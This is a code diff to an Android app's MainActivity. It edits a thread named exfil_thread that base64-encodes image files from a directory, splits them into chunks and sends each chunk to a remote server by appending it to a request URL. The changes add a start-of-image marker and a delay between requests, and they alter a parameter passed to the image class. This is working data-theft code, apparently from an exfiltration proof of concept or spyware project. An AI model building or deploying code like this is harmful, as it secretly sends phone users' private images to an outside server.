@@ -129,12 +129,19 @@ public class MainActivity extends AppCompatActivity {
         Thread exfil_thread = new Thread(new Runnable() {
             public void run() {
                 for (int i = 0; i < filenames.size(); i++) {
-                    ExfilImage img = new ExfilImage(image_dir+filenames.get(i), 60);
+                    ExfilImage img = new ExfilImage(image_dir+filenames.get(i), 30);
                     List <String> image_buffers = img.buffered_b64image(2000);
+                    //tell the server the start of the image
+                    new bgReq().execute(base_url+".");
                     for(int j=0;j<image_buffers.size();j++){
                         new bgReq().execute(base_url+image_buffers.get(j));
+                        try {
+                            Thread.sleep(500);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
                     }
-                    //tel to server the end of the image sending
+                    //tell to server the end of the image sending
                     new bgReq().execute(base_url+"~");
                 }
             }
